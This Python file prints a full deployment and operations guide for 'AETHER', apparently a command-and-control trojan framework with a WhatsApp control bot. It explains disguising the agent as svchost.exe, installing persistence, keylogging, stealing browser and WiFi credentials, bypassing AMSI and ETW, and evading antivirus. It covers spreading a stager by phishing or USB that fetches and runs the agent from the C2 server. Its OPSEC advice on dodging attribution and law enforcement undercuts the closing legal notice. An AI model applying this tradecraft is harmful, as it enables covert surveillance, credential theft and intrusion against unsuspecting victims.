#!/usr/bin/env python3
"""
╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗ - AETHER C2 Framework
║ ║ ║ ║ ║╠═╝║  ║╣ ╠╦╝   Complete Deployment & Operations Guide
╚═╝╩   ╩ ║ ║ ╩═╝╚═╝╩╚═

Step-by-step instructions for deploying and operating the full AETHER system.
"""

DEPLOYMENT_GUIDE = """
╔════════════════════════════════════════════════════════════════════════════╗
║                   AETHER C2 - DEPLOYMENT & OPERATIONS GUIDE               ║
╚════════════════════════════════════════════════════════════════════════════╝


█████████████████████████████████████████████████████████████████████████████
█ SECTION 1: INITIAL SETUP & CONFIGURATION                                  █
█████████████████████████████████████████████████████████████████████████████

┌─ STEP 1: Run the Setup Script ────────────────────────────────────────────┐
│                                                                             │
│ Launch the interactive setup tool:                                        │
│                                                                             │
│   python3 AETHER_SETUP.py                                                │
│                                                                             │
│ Menu Options:                                                              │
│   [1] Configure C2 Server                                                 │
│   [2] Configure Agent                                                     │
│   [3] Configure Builder                                                   │
│   [4] Configure Stager                                                    │
│   [5] Configure WhatsApp Bot                                              │
│   [6] Install Dependencies                                                │
│   [7] Run Components                                                      │
│   [8] View Full Configuration Guide                                       │
│   [9] Validate All Configurations                                         │
│                                                                             │
│ Expected time: 10-15 minutes                                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ STEP 2: Configure C2 Server ─────────────────────────────────────────────┐
│                                                                             │
│ Select option [1] from main menu                                          │
│                                                                             │
│ You'll be prompted for:                                                   │
│   • Primary C2 Host: Your server FQDN or IP                              │
│   • Primary C2 Port: Listen port (default: 443)                          │
│   • Encryption Key: 64-character random string                           │
│   • Beacon Settings: Interval (30s), Jitter (5s), Adaptive (yes)        │
│                                                                             │
│ Example values:                                                            │
│   Primary Host: c2.example.com                                           │
│   Primary Port: 443                                                      │
│   Encryption Key: (auto-generate recommended)                            │
│   Beacon Interval: 30 seconds                                            │
│                                                                             │
│ What gets saved:                                                          │
│   → config.json (c2 section)                                            │
│   → server/aether_server.py uses these settings                         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ STEP 3: Configure Agent ─────────────────────────────────────────────────┐
│                                                                             │
│ Select option [2] from main menu                                          │
│                                                                             │
│ Agent Name:                                                               │
│   Choose a Windows process name for the agent                            │
│   Examples: svchost, explorer, winlogon, taskhsot                       │
│   → Used to disguise the malware on target system                        │
│                                                                             │
│ Persistence Methods:                                                      │
│   ✓ Enable all of:                                                       │
│     • Registry: HKCU\\Software\\Microsoft\\Windows\\Run                  │
│     • Scheduled Task: Windows Task Scheduler                             │
│     • Service: Windows Service installation                              │
│     • WMI: Event subscriptions                                           │
│   → Agent survives system reboot                                         │
│                                                                             │
│ Intelligence Modules (enable which you need):                           │
│   ✓ keylogger (HIGH RISK: Easy detection)                               │
│   ✓ screenshot (MEDIUM RISK: Periodic captures)                         │
│   ○ webcam (VERY HIGH RISK: Can trigger warnings)                       │
│   ○ audio (VERY HIGH RISK: Can trigger warnings)                        │
│   ✓ browser (MEDIUM RISK: Cookie/password stealing)                     │
│   ✓ wifi (MEDIUM RISK: WiFi credential stealing)                        │
│   ✓ clipboard (LOW RISK: Passive monitoring)                            │
│                                                                             │
│ Evasion Techniques (enable all):                                         │
│   ✓ AMSI Bypass (Windows antimalware scanner)                           │
│   ✓ ETW Bypass (Event Tracing for Windows)                             │
│   ✓ Sandbox Detection (Detect analysis environment)                    │
│   ✓ VM Detection (Detect virtual machines)                             │
│   ✓ Debugger Detection (Detect debugging tools)                        │
│   ✓ Sleep Obfuscation (Hide sleep calls)                               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ STEP 4: Configure Builder ──────────────────────────────────────────────┐
│                                                                             │
│ Select option [3] from main menu                                          │
│                                                                             │
│ Output Executable Name:                                                  │
│   Default: svchost.exe                                                  │
│   Alternatives:                                                           │
│     • explorer.exe (file explorer)                                      │
│     • winlogon.exe (Windows logon process)                              │
│     • taskhsot.exe (typo of taskhosts, often overlooked)               │
│   → Use a legitimate-looking name                                       │
│                                                                             │
│ Obfuscation & Protection:                                               │
│   ✓ Use PyArmor: Obfuscate Python bytecode                             │
│   ✓ Use UPX: Compress binary (also confuses scanners)                 │
│   ✓ Obfuscation Level: "high"                                          │
│   Optional: Custom icon (builder/windows.ico)                          │
│                                                                             │
│ Build Output:                                                             │
│   Generated at: build_{timestamp}/dist/svchost.exe                     │
│   Size: Typically 30-50MB (larger due to obfuscation)                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ STEP 5: Configure Stager ────────────────────────────────────────────────┐
│                                                                             │
│ Select option [4] from main menu                                          │
│                                                                             │
│ Config URL:                                                               │
│   Where stager downloads agent configuration                             │
│   Example: https://c2.example.com/config.json                          │
│   Must return JSON with agent settings                                  │
│   Note: Keep accessible from target network!                            │
│                                                                             │
│ Agent URL:                                                                │
│   Where stager downloads main agent executable                          │
│   Example: https://c2.example.com/agent.exe                           │
│   This is the compiled agent from Step 4                               │
│   Note: Keep accessible from target network!                           │
│                                                                             │
│ Typical Deployment Flow:                                                │
│   1. Distribute stager.exe to targets                                   │
│   2. Stager downloads config.json from server                          │
│   3. Stager downloads agent.exe from server                            │
│   4. Stager executes agent.exe in memory                               │
│   5. Agent connects back to C2 server                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ STEP 6: Configure WhatsApp Bot (Optional) ───────────────────────────────┐
│                                                                             │
│ Select option [5] from main menu                                          │
│                                                                             │
│ Bot URL:                                                                  │
│   Where AETHER connects to Baileys bot                                  │
│   Default: http://localhost:3000                                       │
│   Change if bot runs on different machine                              │
│                                                                             │
│ Authentication Password:                                                │
│   ⚠️  CHANGE FROM DEFAULT! (aether2025)                                │
│   Use: MySecurePassword123!                                           │
│   Minimum 8 characters, should be strong                               │
│                                                                             │
│ Authorized Users:                                                        │
│   Add only trusted WhatsApp numbers:                                    │
│   Format: +{country_code}{number}                                      │
│   Examples:                                                              │
│     +1234567890 (USA)                                                  │
│     +44987654321 (UK)                                                  │
│     +49301234567 (Germany)                                            │
│   Only these numbers can control AETHER via WhatsApp                   │
│                                                                             │
│ Optional Features:                                                       │
│   ✓ Command History: Log all WhatsApp commands                         │
│   ✓ Session Linking: Connect to specific agents                        │
│   ○ File Transfer: (not recommended via WhatsApp)                      │
│   ○ Batch Commands: (requires admin setup)                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ STEP 7: Install Dependencies ────────────────────────────────────────────┐
│                                                                             │
│ Select option [6] from main menu                                          │
│                                                                             │
│ Python Dependencies:                                                     │
│   Install from requirements.txt                                         │
│   Installs: cryptography, pycryptodome, PIL, opencv, etc.             │
│   Command: pip install -r requirements.txt                            │
│   Time: ~5-10 minutes                                                  │
│                                                                             │
│ Node.js Dependencies (WhatsApp bot):                                    │
│   Install in WA-BOT-Base/                                             │
│   Installs: @whiskeysockets/baileys, chalk, pino                      │
│   Command: cd WA-BOT-Base && npm install                              │
│   Time: ~3-5 minutes                                                   │
│                                                                             │
│ Verification:                                                            │
│   After installation, dependencies should appear in:                   │
│     • Python: Installed packages in site-packages                      │
│     • Node.js: node_modules/ directory in WA-BOT-Base                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘


█████████████████████████████████████████████████████████████████████████████
█ SECTION 2: DEPLOYMENT & STARTUP                                            █
█████████████████████████████████████████████████████████████████████████████

┌─ PHASE 1: Start C2 Server ────────────────────────────────────────────────┐
│                                                                             │
│ Terminal 1 (C2 Server):                                                  │
│                                                                             │
│   python3 server/aether_server.py                                       │
│                                                                             │
│ Expected Output:                                                          │
│   ╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗                                               │
│   ║ ╦╠═╝ ║ ╠═╝║  ║╣ ╠╦╝                                               │
│   ╚═╝╩   ╩ ╩  ╩═╝╚═╝╩╚═                                               │
│   Universal Class Control v1.0                                          │
│   Listener: 0.0.0.0:443                                                │
│   ✓ Server initialized                                                 │
│   ✓ Command suite loaded                                              │
│   AETHER>                                                              │
│                                                                             │
│ If you see AETHER> prompt, server is running!                          │
│                                                                             │
│ Available Commands (in server):                                          │
│   • help - Show command help                                           │
│   • sessions - List connected agents                                   │
│   • interact <session_id> - Connect to agent                          │
│   • whatsapp enable - Start WhatsApp listener                         │
│   • generate - Generate new agent config                              │
│   • config - Show configuration                                       │
│   • exit - Shutdown server                                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ PHASE 2: Start WhatsApp Bot (Optional) ──────────────────────────────────┐
│                                                                             │
│ Terminal 2 (WhatsApp Bot):                                               │
│                                                                             │
│   cd WA-BOT-Base                                                        │
│   npm start                                                             │
│                                                                             │
│ Expected Output:                                                          │
│   > basebot@1.0.1 start                                                │
│   > node index.js                                                      │
│   ┌─────────────────────────────────┐                                 │
│   │ Baileys Multi-Device WhatsApp   │                                 │
│   │ API Version: 7.0.0-rc.2         │                                 │
│   └─────────────────────────────────┘                                 │
│   [timestamp] Generating QR Code...                                   │
│   [QR Code displayed]                                                 │
│                                                                             │
│ What to do:                                                              │
│   1. Open WhatsApp on your phone                                       │
│   2. Settings → Linked Devices → Link a device                        │
│   3. Scan the QR code shown in terminal                               │
│   4. Wait for connection message: "✓ Connected"                        │
│                                                                             │
│ After successful connection:                                            │
│   • You'll see: "✓ Connected to WhatsApp"                             │
│   • Bot is ready to receive messages                                   │
│   • Don't close this terminal                                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ PHASE 3: Enable WhatsApp in AETHER (Optional) ────────────────────────────┐
│                                                                             │
│ Back in Terminal 1 (C2 Server):                                          │
│                                                                             │
│   AETHER> whatsapp enable                                              │
│                                                                             │
│ Expected Output:                                                          │
│   ✓ WhatsApp integration enabled                                       │
│   ✓ Bot connected to AETHER                                           │
│   ✓ Listening for WhatsApp messages                                   │
│                                                                             │
│ Next Steps:                                                              │
│   AETHER> whatsapp authorize +1234567890                              │
│   AETHER> whatsapp status                                             │
│                                                                             │
│ Authorization Status:                                                    │
│   AETHER> whatsapp status                                             │
│   ┌─ WhatsApp Integration Status ─┐                                   │
│   │ Status: Enabled               │                                   │
│   │ Bot Connected: Yes            │                                   │
│   │ Authorized Users: 1           │                                   │
│   │ Active Sessions: 0            │                                   │
│   └───────────────────────────────┘                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘


█████████████████████████████████████████████████████████████████████████████
█ SECTION 3: BUILDING & TESTING AGENTS                                       █
█████████████████████████████████████████████████████████████████████████████

┌─ BUILD AGENT EXECUTABLE ──────────────────────────────────────────────────┐
│                                                                             │
│ Terminal 3 (Builder):                                                    │
│                                                                             │
│   python3 builder/compile.py                                           │
│                                                                             │
│ Build Process:                                                            │
│   1. Create build directory: build_20251207_143022_a1b2c3d4/          │
│   2. Obfuscate Python source with PyArmor                             │
│   3. Bundle with PyInstaller                                          │
│   4. Compress with UPX                                                │
│   5. Generate final executable                                        │
│                                                                             │
│ Expected Output:                                                          │
│   [*] Building AETHER Agent                                            │
│   [*] Build ID: 20251207_143022_a1b2c3d4                             │
│   [*] Obfuscating with PyArmor...                                    │
│   [*] Bundling with PyInstaller...                                   │
│   [*] Compressing with UPX...                                        │
│   [✓] Build complete!                                                 │
│   [✓] Output: build_20251207_143022_a1b2c3d4/dist/svchost.exe       │
│   [✓] Size: 47.2 MB                                                  │
│                                                                             │
│ Output Location:                                                          │
│   build_{BUILD_ID}/dist/svchost.exe                                   │
│                                                                             │
│ File Details:                                                             │
│   • Size: 30-50MB (obfuscation makes it larger)                       │
│   • Icon: Windows executable icon (from builder/windows.ico)          │
│   • Properties: Looks like legitimate svchost.exe                    │
│   • Signature: None (unsigned)                                        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ TESTING AGENT LOCALLY ──────────────────────────────────────────────────┐
│                                                                             │
│ DO NOT RUN ON YOUR MAIN SYSTEM!                                          │
│                                                                             │
│ Use a test environment:                                                   │
│   • Virtual machine (VirtualBox, VMware)                               │
│   • Isolated lab network                                               │
│   • Disposable test machine                                            │
│                                                                             │
│ Test Steps:                                                              │
│   1. Take snapshot of test VM                                         │
│   2. Place agent executable on test system                            │
│   3. Ensure C2 server is running and accessible                       │
│   4. Execute agent: svchost.exe                                       │
│   5. Check C2 server for new session                                  │
│      AETHER> sessions                                                 │
│   6. Interact with session:                                           │
│      AETHER> interact agent_001                                       │
│      AETHER> whoami                                                   │
│      AETHER> screenshot                                               │
│   7. Restore VM snapshot to clean state                               │
│                                                                             │
│ Verification:                                                            │
│   ✓ Agent appears in sessions list                                    │
│   ✓ Commands execute successfully                                     │
│   ✓ File operations work                                              │
│   ✓ Intelligence gathering functions                                  │
│   ✓ Persistence installed (reboot test)                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ DEPLOY STAGER (RECOMMENDED) ─────────────────────────────────────────────┐
│                                                                             │
│ Why use stager?                                                           │
│   • Stager is small (~5-10MB after compression)                        │
│   • Easy to send via email, USB, or social engineering               │
│   • Can update agent without rebuilding stager                        │
│   • Can serve different configs per victim                            │
│                                                                             │
│ Setup:                                                                   │
│                                                                             │
│   1. Build stager executable:                                         │
│      python3 builder/compile.py --stager                             │
│                                                                             │
│   2. Build agent executable:                                          │
│      python3 builder/compile.py                                      │
│                                                                             │
│   3. Host on C2 server:                                               │
│      • Copy agent.exe to web server at /agent.exe                    │
│      • Copy config.json to web server at /config.json                │
│      • Ensure accessible via: https://c2.example.com/agent.exe       │
│                                                                             │
│   4. Distribute stager.exe to targets:                                │
│      • Email attachment                                               │
│      • Drive-by download                                              │
│      • USB stick                                                      │
│      • Social engineering                                             │
│                                                                             │
│   5. Monitor C2 console:                                              │
│      AETHER> sessions                                                 │
│      [✓] agent_001 - DESKTOP-USER1 (admin privileges)                │
│                                                                             │
│ Deployment Flow:                                                         │
│   User executes stager.exe                                            │
│        ↓                                                                │
│   Stager downloads config.json from C2                               │
│        ↓                                                                │
│   Stager downloads agent.exe into memory                             │
│        ↓                                                                │
│   Stager executes agent.exe                                          │
│        ↓                                                                │
│   Agent connects to C2 server                                        │
│        ↓                                                                │
│   AETHER: "✓ New session: agent_001"                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘


█████████████████████████████████████████████████████████████████████████████
█ SECTION 4: AGENT COMMAND EXECUTION                                         █
█████████████████████████████████████████████████████████████████████████████

┌─ INTERACT WITH AGENTS ────────────────────────────────────────────────────┐
│                                                                             │
│ View all sessions:                                                        │
│   AETHER> sessions                                                       │
│   [✓] agent_001 - DESKTOP-USER1 (192.168.1.100)                      │
│   [✓] agent_002 - SERVER-DC (192.168.1.200)                          │
│                                                                             │
│ Connect to agent:                                                        │
│   AETHER> interact agent_001                                           │
│   [*] Connected to agent_001 (DESKTOP-USER1)                         │
│   agent_001>                                                            │
│                                                                             │
│ Get system info:                                                         │
│   agent_001> whoami                                                    │
│   [+] Result: DOMAIN\\user                                            │
│                                                                             │
│   agent_001> hostname                                                  │
│   [+] Result: DESKTOP-USER1                                           │
│                                                                             │
│   agent_001> sysinfo                                                  │
│   [+] OS: Windows 10 Professional                                     │
│   [+] Build: 19045                                                    │
│   [+] Architecture: x86_64                                            │
│                                                                             │
│ Gather intelligence:                                                     │
│   agent_001> screenshot                                               │
│   [✓] Screenshot saved to: screenshots/agent_001_20251207_143022.png│
│                                                                             │
│   agent_001> keylog start                                             │
│   [✓] Keylogger started                                               │
│                                                                             │
│   agent_001> keylog dump                                              │
│   [+] Dumping keylog buffer...                                        │
│   [+] gmail.com password123                                           │
│   [+] facebook.com mypassword456                                     │
│                                                                             │
│   agent_001> clipboard                                                │
│   [+] Clipboard contents:                                             │
│   [+] Meeting notes: Project X timeline...                           │
│                                                                             │
│ File operations:                                                         │
│   agent_001> ls C:\\Users\\user\\Documents                           │
│   [+] Files:                                                          │
│   [+]  budget.xlsx (245 KB)                                          │
│   [+]  report.docx (512 KB)                                          │
│                                                                             │
│   agent_001> cat C:\\Users\\user\\Documents\\budget.xlsx              │
│   [+ File contents displayed...                                       │
│                                                                             │
│   agent_001> download C:\\Users\\user\\AppData\\Local\\Google\\Chrome│
│   [✓] Downloading Chrome profile...                                   │
│   [✓] Saved to: exfil/agent_001_chrome_profile/                     │
│                                                                             │
│ Process management:                                                      │
│   agent_001> ps                                                       │
│   [+] PID    Name              User       Memory                      │
│   [+] 4      System            SYSTEM     512 KB                      │
│   [+] 456    explorer.exe      USER1      45 MB                       │
│   [+] 1234   svchost.exe       SYSTEM     8.2 MB  <- AETHER AGENT   │
│                                                                             │
│   agent_001> kill 1234                                                │
│   [✗] Killed process 1234                                             │
│                                                                             │
│ Persistence:                                                             │
│   agent_001> persist registry                                         │
│   [✓] Registry persistence installed                                  │
│   [✓] Location: HKCU\\Software\\Microsoft\\Windows\\Run              │
│                                                                             │
│   agent_001> persist scheduled_task                                   │
│   [✓] Scheduled task persistence installed                           │
│   [✓] Task: WindowsFontCacheUpdate                                   │
│                                                                             │
│ Exit agent:                                                              │
│   agent_001> back                                                     │
│   [*] Disconnected from agent_001                                     │
│   AETHER>                                                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ WHATSAPP COMMAND EXECUTION (Optional) ────────────────────────────────────┐
│                                                                             │
│ Send commands via WhatsApp:                                              │
│                                                                             │
│ From your WhatsApp phone:                                               │
│   Message 1: auth MySecurePassword123!                                │
│   Bot: ✓ Authorized! Welcome to AETHER                               │
│                                                                             │
│   Message 2: sessions                                                  │
│   Bot: 📋 Active Sessions:                                            │
│         • agent_001: DESKTOP-USER1                                    │
│         • agent_002: SERVER-DC                                        │
│                                                                             │
│   Message 3: link agent_001                                           │
│   Bot: ✓ Linked to session: agent_001                                │
│                                                                             │
│   Message 4: whoami                                                   │
│   Bot: ✓ Result: DOMAIN\\user                                        │
│                                                                             │
│   Message 5: screenshot                                               │
│   Bot: [Screenshot image sent to WhatsApp]                           │
│                                                                             │
│   Message 6: help                                                     │
│   Bot: 📚 Available Commands:                                         │
│         • sessions - List agents                                     │
│         • link <id> - Connect to agent                              │
│         • whoami - Current user                                      │
│         • screenshot - Capture screen                                │
│         • [... 50+ more commands]                                    │
│                                                                             │
│ WhatsApp Commands:                                                       │
│   • auth <password> - Authenticate                                    │
│   • sessions - List connected agents                                  │
│   • link <session_id> - Select agent                                 │
│   • unlink - Disconnect from agent                                   │
│   • whoami, hostname, sysinfo - System info                         │
│   • screenshot - Capture screen                                      │
│   • ps - List processes                                              │
│   • ls <path> - List directory                                       │
│   • cat <file> - Read file                                           │
│   • keylog start/stop/dump - Keylogger control                      │
│   • clipboard - Get clipboard                                        │
│   • help - Show all commands                                         │
│   • status - Session status                                          │
│   • history - Command history                                        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘


█████████████████████████████████████████████████████████████████████████████
█ SECTION 5: MONITORING & MAINTENANCE                                        █
█████████████████████████████████████████████████████████████████████████████

┌─ MONITORING AGENT ACTIVITY ──────────────────────────────────────────────┐
│                                                                             │
│ Check active sessions:                                                   │
│   AETHER> sessions                                                      │
│   ✓ agent_001 - DESKTOP-USER1 (last seen 2 minutes ago)              │
│   ✓ agent_002 - SERVER-DC (last seen 5 seconds ago)                  │
│   ✗ agent_003 - Offline (last seen 1 hour ago)                      │
│                                                                             │
│ Check beacon status:                                                     │
│   AETHER> interact agent_001                                           │
│   agent_001> beacon_config                                            │
│   [+] Beacon Interval: 30 seconds                                     │
│   [+] Jitter: 5 seconds                                               │
│   [+] Last Check-in: 3 seconds ago                                   │
│   [+] Missed Check-ins: 0                                             │
│                                                                             │
│ View command history:                                                    │
│   agent_001> history                                                   │
│   [+] Last 10 commands:                                               │
│   [+] 1. whoami (2 minutes ago)                                      │
│   [+] 2. screenshot (1 minute ago)                                   │
│   [+] 3. ps (30 seconds ago)                                         │
│                                                                             │
│ Monitor WhatsApp:                                                        │
│   AETHER> whatsapp status                                             │
│   ┌─ WhatsApp Integration Status ─┐                                  │
│   │ Status: Enabled               │                                  │
│   │ Bot Connected: Yes            │                                  │
│   │ Last Activity: 2 minutes ago   │                                 │
│   │ Messages Today: 47            │                                  │
│   │ Authorized Users: 1           │                                  │
│   └───────────────────────────────┘                                  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

┌─ TROUBLESHOOTING ────────────────────────────────────────────────────────┐
│                                                                             │
│ Problem: Agent not connecting                                            │
│   Solution:                                                              │
│   1. Check C2 server is running: python3 server/aether_server.py     │
│   2. Check network connectivity from target to C2                      │
│   3. Verify firewall rules allow port 443                            │
│   4. Check encryption key matches between agent and server            │
│   5. Review server logs for connection attempts                       │
│   6. Try rebuilding agent with correct C2 host/port                  │
│                                                                             │
│ Problem: WhatsApp bot not responding                                    │
│   Solution:                                                              │
│   1. Verify bot is running: npm start in WA-BOT-Base/                │
│   2. Check QR code scanned successfully                               │
│   3. Verify AETHER server is running                                  │
│   4. Enable WhatsApp: AETHER> whatsapp enable                         │
│   5. Check user is authorized: AETHER> whatsapp status               │
│   6. Verify bot_url is correct in config.json                        │
│   7. Check bot server logs for errors                                │
│                                                                             │
│ Problem: Low detection on VirusTotal                                    │
│   Solution:                                                              │
│   1. Increase obfuscation: "obfuscation_level": "high"               │
│   2. Enable all evasion techniques                                    │
│   3. Change executable name and icon                                  │
│   4. Compress with UPX: "use_upx": true                              │
│   5. Wait before scanning (signatures update)                        │
│                                                                             │
│ Problem: Agent detected and killed by antivirus                        │
│   Solution:                                                              │
│   1. Use domain fronting (https_fronting channel)                     │
│   2. Encrypt all communications                                       │
│   3. Enable AMSI/ETW bypass                                          │
│   4. Use sleep obfuscation                                           │
│   5. Disable high-risk modules (webcam, audio)                       │
│   6. Use legitimate-looking process name                             │
│                                                                             │
│ Problem: Persistence not surviving reboot                              │
│   Solution:                                                              │
│   1. Check all persistence methods enabled:                           │
│      • registry, scheduled_task, service, wmi                        │
│   2. Verify agent runs with sufficient privileges                    │
│   3. Check persistence installed:                                    │
│      agent> persist registry                                         │
│   4. Test reboot:                                                     │
│      - Take snapshot before reboot                                   │
│      - Reboot target system                                          │
│      - Check if agent reconnects                                    │
│      - Restore snapshot after testing                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘


█████████████████████████████████████████████████████████████████████████████
█ SECTION 6: SECURITY & OPERATIONAL SECURITY (OPSEC)                         █
█████████████████████████████████████████████████████████████████████████████

┌─ OPERATIONAL SECURITY BEST PRACTICES ──────────────────────────────────────┐
│                                                                             │
│ 1. C2 Infrastructure:                                                    │
│    ✓ Use domain with legitimate business name                         │
│    ✓ Register with privacy to hide ownership                          │
│    ✓ Use cloud hosting with multiple locations for redundancy        │
│    ✓ Implement SSL certificate (Let's Encrypt free option)            │
│    ✓ Use DGA (Domain Generation Algorithm) for fallback domains      │
│    ✓ Enable logging to track all agent activity                      │
│    ✓ Rotate C2 infrastructure regularly                              │
│                                                                             │
│ 2. Agent Deployment:                                                    │
│    ✓ Use social engineering/phishing for initial compromise           │
│    ✓ Spoof legitimate executables                                    │
│    ✓ Use living-off-the-land binaries when possible                  │
│    ✓ Disable high-risk modules until needed                          │
│    ✓ Use legitimate-looking command names                            │
│    ✓ Avoid suspicious file operations                                │
│    ✓ Monitor endpoint detection logs                                 │
│                                                                             │
│ 3. WhatsApp Bot:                                                         │
│    ✓ Use dedicated phone number for bot account                       │
│    ✓ Use strong, unique authentication password                      │
│    ✓ Whitelist only trusted phone numbers                            │
│    ✓ Monitor WhatsApp activity regularly                             │
│    ✓ Delete message history periodically                             │
│    ✓ Use encrypted messaging protocols                               │
│    ✓ Store bot session data securely                                 │
│                                                                             │
│ 4. Communication Security:                                              │
│    ✓ Encrypt all agent ↔ C2 communications (always HTTPS)            │
│    ✓ Use strong encryption keys (64+ characters)                     │
│    ✓ Implement key rotation                                          │
│    ✓ Use domain fronting to disguise traffic                         │
│    ✓ Enable beacon jitter to avoid pattern detection                │
│    ✓ Use adaptive beacon intervals                                   │
│    ✓ Implement traffic obfuscation                                   │
│                                                                             │
│ 5. Operational Discipline:                                              │
│    ✓ Use VPN/proxy when accessing C2 infrastructure                   │
│    ✓ Use separate machine for C2 operations                           │
│    ✓ Never test agents on production targets first                    │
│    ✓ Use throwaway accounts for all services                          │
│    ✓ Enable 2FA on all service accounts                               │
│    ✓ Log all activities for auditing                                  │
│    ✓ Clean up after operations                                       │
│    ✓ Avoid attribution through operational discipline                │
│                                                                             │
│ 6. Incident Response:                                                    │
│    ✓ Have backup C2 infrastructure ready                              │
│    ✓ Can quickly migrate agents to new C2                            │
│    ✓ Monitor for law enforcement activity                            │
│    ✓ Have exit strategy planned                                      │
│    ✓ Know your legal jurisdiction                                    │
│    ✓ Maintain plausible deniability                                  │
│    ✓ Document everything for legal defense                           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

┌─ COMPLIANCE & LEGAL NOTICE ──────────────────────────────────────────────┐
│                                                                             │
│ ⚠️  IMPORTANT LEGAL NOTICE:                                               │
│                                                                             │
│ AETHER is provided for educational and authorized security testing only. │
│ Unauthorized access to computer systems is ILLEGAL in most jurisdictions. │
│                                                                             │
│ By using AETHER, you agree:                                              │
│   • You have explicit written permission from system owner              │
│   • You understand applicable laws in your jurisdiction                 │
│   • You accept full legal responsibility for your actions               │
│   • The author/contributors are not responsible for misuse             │
│                                                                             │
│ Potential Legal Consequences:                                            │
│   • Criminal charges under Computer Fraud & Abuse Act (CFAA)           │
│   • Civil liability and damages                                        │
│   • Prison sentence (up to 10 years in some cases)                     │
│   • Heavy fines (up to $250,000)                                       │
│                                                                             │
│ Always:                                                                  │
│   ✓ Get written authorization before testing                          │
│   ✓ Understand all applicable laws                                    │
│   ✓ Keep detailed documentation                                       │
│   ✓ Report findings responsibly                                       │
│   ✓ Protect victim privacy                                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘


█████████████████████████████████████████████████████████████████████████████
█ QUICK REFERENCE CARD                                                       █
█████████████████████████████████████████████████████████████████████████████

┌─ CONFIGURATION SUMMARY ───────────────────────────────────────────────────┐
│                                                                             │
│ 1. Run setup:        python3 AETHER_SETUP.py                             │
│ 2. Fill all configs: C2, Agent, Builder, Stager, WhatsApp              │
│ 3. Install deps:     pip install -r requirements.txt                     │
│                      cd WA-BOT-Base && npm install                       │
│ 4. Validate:         python3 AETHER_SETUP.py → [9] Validate            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ STARTUP SEQUENCE ────────────────────────────────────────────────────────┐
│                                                                             │
│ Terminal 1: python3 server/aether_server.py                              │
│ Terminal 2: cd WA-BOT-Base && npm start (optional)                      │
│ Terminal 1: AETHER> whatsapp enable (optional)                          │
│ Terminal 3: python3 builder/compile.py                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ DEPLOYMENT SEQUENCE ────────────────────────────────────────────────────┐
│                                                                             │
│ 1. Build agent:      python3 builder/compile.py                         │
│ 2. Deploy stager:    Distribute stager.exe to targets                   │
│ 3. Monitor:          AETHER> sessions                                   │
│ 4. Interact:         AETHER> interact agent_001                         │
│ 5. Gather intel:     agent_001> screenshot                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ KEY FILES ───────────────────────────────────────────────────────────────┐
│                                                                             │
│ Configuration:    config.json                                            │
│ Setup Script:     AETHER_SETUP.py                                       │
│ Config Templates: CONFIG_TEMPLATES.py                                   │
│ C2 Server:        server/aether_server.py                               │
│ Agent:            agent/aether_agent.py                                 │
│ Builder:          builder/compile.py                                    │
│ WhatsApp Bot:     WA-BOT-Base/main.js                                  │
│ Stager:           stager/stager.py                                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════════

End of Deployment Guide

For more information:
  • Setup Guide: python3 AETHER_SETUP.py
  • Config Templates: python3 CONFIG_TEMPLATES.py
  • WhatsApp Integration: WA-BOT-Base/AETHER_README.md
  • Full Documentation: See all *_GUIDE.md and *_SETUP.py files

═══════════════════════════════════════════════════════════════════════════════
"""

if __name__ == '__main__':
    print(DEPLOYMENT_GUIDE)
